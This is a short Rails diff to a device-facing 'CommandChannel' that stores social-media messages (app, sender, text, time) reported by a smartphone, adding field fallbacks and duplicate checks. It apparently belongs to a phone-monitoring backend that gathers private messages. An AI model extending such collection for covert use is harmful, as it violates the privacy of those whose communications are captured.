@@ -25,7 +25,7 @@ class CommandChannel < ApplicationCable::Channel
 
   # Generic receive handler for messages from device
   def receive(data)
-    message_type = data['type']
+    message_type = data['type'] || data['action']
     payload = data['payload'] || data['data'] || data
     request_id = data['request_id']
     
@@ -66,13 +66,18 @@ class CommandChannel < ApplicationCable::Channel
     return unless messages.is_a?(Array)
 
     messages.each do |msg|
-      SocialMediaMessage.create!(
-        smartphone: smartphone,
-        app_name: msg['app'],
-        sender: msg['sender'],
-        body: msg['text'],
-        sent_at: Time.at(msg['timestamp'].to_i / 1000)
-      )
+      body = msg['text'] || msg['content']
+      sent_at = Time.at(msg['timestamp'].to_i / 1000)
+
+      unless SocialMediaMessage.exists?(smartphone: smartphone, app_name: msg['app'], sender: msg['sender'], body: body, sent_at: sent_at)
+        SocialMediaMessage.create!(
+          smartphone: smartphone,
+          app_name: msg['app'],
+          sender: msg['sender'],
+          body: body,
+          sent_at: sent_at
+        )
+      end
     end
 
     Rails.logger.info "[CommandChannel] Processed #{messages.size} social media messages from #{@device_id}"
